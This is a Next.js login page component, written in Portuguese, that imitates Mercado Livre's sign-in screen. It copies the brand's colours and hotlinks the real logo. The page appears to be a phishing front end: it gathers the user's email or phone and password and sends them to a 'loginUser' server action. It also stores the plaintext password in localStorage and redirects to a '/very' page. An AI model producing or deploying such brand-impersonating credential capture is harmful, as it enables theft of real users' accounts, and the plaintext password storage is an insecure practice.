"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

import { LoadingComponent } from "@/loading";
import { loginUser } from "@/actions/auth";

export default function AcessPage() {
  const router = useRouter();
  const [form, setForm] = useState({ email: "", password: "" });
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    setTimeout(() => {
      setLoading(false);
    }, 1500);
  }, []);

  if (loading) {
    return <LoadingComponent />;
  }

  const handleChangeInfoLogin = async () => {
    try {
      await loginUser(form.email, form.password);

      localStorage.setItem("Email", form.email);
      localStorage.setItem("Password", form.password);

      router.push("/very");
    } catch {
      console.error("Erro ao fazer login");
    }
  };

  return (
    <div>
      <header className="flex items-center justify-center bg-[#FFE600] border-b border-[#e2e0e2] p-4">
        <a href="./" aria-label="ir para a página inicial">
          <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.117/mercadolibre/pt_logo_large_plus@2x.webp" />
        </a>
      </header>

      <main className="mt-16 flex items-center justify-center">
        <div className="w-full p-10 md:max-w-[500px] flex flex-col">
          <h1 className="text-4xl font-medium">Entrar</h1>

          <span className="text-[#5c525b] text-xl mt-2">
            A casa é sua, se aprochegue.
          </span>

          <label htmlFor="" className="text-[#222] mt-8">
            Email ou Telefone
          </label>

          <input
            type="text"
            className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
            value={form.email}
            onChange={(e) =>
              setForm((prevForm) => ({ ...prevForm, email: e.target.value }))
            }
          />

          <label htmlFor="">Senha super secreta</label>
          <input
            type="text"
            className="rounded-xl border-[#e2e0e2] border-[1px] text-base p-4 text-[#222] mt-2 mb-4"
            placeholder="digite sua senha"
            value={form.password}
            onChange={(e) =>
              setForm((prevForm) => ({ ...prevForm, password: e.target.value }))
            }
          />

          <div className="flex items-center gap-2 mt-1">
            <input type="checkbox" className=" accent-[#2968C8] h-6 w-6" />

            <span>Continuar conectado</span>
          </div>

          <button
            className="bg-[#2968C8] text-white h-[50px] w-full text-xl rounded-full mt-10"
            onClick={handleChangeInfoLogin}
          >
            Entrar
          </button>
        </div>
      </main>
    </div>
  );
}
